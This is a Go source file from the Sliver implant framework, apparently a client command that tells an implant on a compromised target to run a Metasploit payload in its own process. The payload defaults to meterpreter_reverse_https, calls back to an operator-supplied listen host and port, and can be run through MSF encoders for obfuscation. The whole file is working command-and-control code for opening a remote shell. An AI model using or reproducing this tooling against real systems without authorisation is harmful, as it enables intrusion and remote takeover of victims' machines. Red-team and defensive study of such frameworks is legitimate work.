package execute

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.
	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
)

// MSFOptions - Options applying to all msf-related execution commands.
type MSFOptions struct {
	Payload    string `long:"payload" short:"P" description:"payload type (auto-completed)" default:"meterpreter_reverse_https" value-name:"compatible payloads"`
	LHost      string `long:"lhost" short:"l" description:"listen host" required:"yes"`
	LPort      int    `long:"lport" short:"p" description:"listen port" default:"4444"`
	Encoder    string `long:"encoder" short:"e" description:"MSF encoder" value-name:"msf encoders"`
	Iterations int    `long:"iterations" short:"i" description:"iterations of the encoder" default:"1"`
}

// MSF - Execute an MSF payload in the current process.
type MSF struct {
	MSFOptions `group:"msf options"`
}

// Execute - Execute an MSF payload in the current process.
func (m *MSF) Execute(args []string) (err error) {

	payloadName := m.Payload
	lhost := m.LHost
	lport := m.LPort
	encoder := m.Encoder
	iterations := m.Iterations

	if lhost == "" {
		return log.Errorf("Invalid lhost '%s', see `help %s`\n", lhost, constants.MsfStr)
	}

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending payload %s %s/%s -> %s:%d ...",
		payloadName, core.ActiveTarget.OS(), core.ActiveTarget.Arch(), lhost, lport)
	go log.SpinUntil(msg, ctrl)
	_, err = transport.RPC.Msf(context.Background(), &clientpb.MSFReq{
		Payload:    payloadName,
		LHost:      lhost,
		LPort:      uint32(lport),
		Encoder:    encoder,
		Iterations: int32(iterations),
		Request:    core.ActiveTarget.Request(),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		return log.Errorf("%s", err)
	}

	log.Infof("Executed payload on target\n")
	return nil
}
